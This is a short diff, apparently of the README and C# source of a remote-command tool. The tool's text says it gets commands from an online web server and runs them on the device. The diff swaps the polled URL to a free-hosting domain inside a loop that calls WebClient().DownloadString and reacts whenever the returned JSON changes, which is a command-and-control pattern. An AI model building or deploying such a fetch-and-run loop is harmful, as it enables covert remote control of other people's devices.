@@ -4,7 +4,7 @@
 <b>This will get the command from online web server.
 </b><br>
   
-                          new WebClient().DownloadString("https://r.significantbyte.com/go.php");<br>
+                          new WebClient().DownloadString("https://ustaad-mailer.000webhostapp.com/go.php");<br>
 <br><br><br>
 <b>Run command in device.</b>
   
@@ -29,7 +29,7 @@
             {
                 try
                 {
-                    json = new WebClient().DownloadString("https://r.significantbyte.com/go.php");
+                    json = new WebClient().DownloadString("https://ustaad-mailer.000webhostapp.com/go.php");
                     if (json != oldjson)
                     {
 
